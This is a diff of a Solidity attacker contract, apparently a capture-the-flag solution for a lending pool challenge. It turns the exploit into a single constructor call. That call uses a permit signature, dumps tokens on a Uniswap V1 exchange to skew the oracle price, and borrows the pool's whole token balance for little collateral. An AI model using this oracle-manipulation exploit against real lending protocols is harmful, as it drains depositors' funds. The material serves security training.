@@ -8,28 +8,19 @@ interface IUniswapV1Exchange {
 }
 
 contract PuppetPoolAttacker {
-    IUniswapV1Exchange public immutable exchange;
     PuppetPool public immutable pool;
-    address public immutable player;
-    address public immutable deployer;
+    IUniswapV1Exchange public immutable exchange;
     uint256 public constant PLAYER_INITIAL_TOKEN_BALANCE = 1000 * 10 ** 18;
-    uint256 public constant PLAYER_INITIAL_ETH_BALANCE = 25 * 10 ** 18;
     uint256 public constant POOL_INITIAL_TOKEN_BALANCE = 100000 * 10 ** 18;
 
-
-    constructor(address _pool, address _player) payable {
+    constructor(address _pool, uint8 v, bytes32 r, bytes32 s, uint256 deadline) payable {
         pool = PuppetPool(_pool);
         exchange = IUniswapV1Exchange(pool.uniswapPair());
-        player = _player;
-        deployer = msg.sender;
-        attack();
-    }
-
-    function attack() public payable {
-        pool.token().transferFrom(player, address(this), PLAYER_INITIAL_TOKEN_BALANCE);
+        pool.token().permit(msg.sender, address(this), PLAYER_INITIAL_TOKEN_BALANCE, deadline, v, r, s);
+        pool.token().transferFrom(msg.sender, address(this), PLAYER_INITIAL_TOKEN_BALANCE);
         pool.token().approve(address(exchange), PLAYER_INITIAL_TOKEN_BALANCE);
         exchange.tokenToEthTransferInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, block.timestamp, payable(address(this)));
-        pool.borrow{value: address(this).balance}(POOL_INITIAL_TOKEN_BALANCE, player);
+        pool.borrow{value: address(this).balance}(POOL_INITIAL_TOKEN_BALANCE, msg.sender);
     }
 
     receive() external payable {}
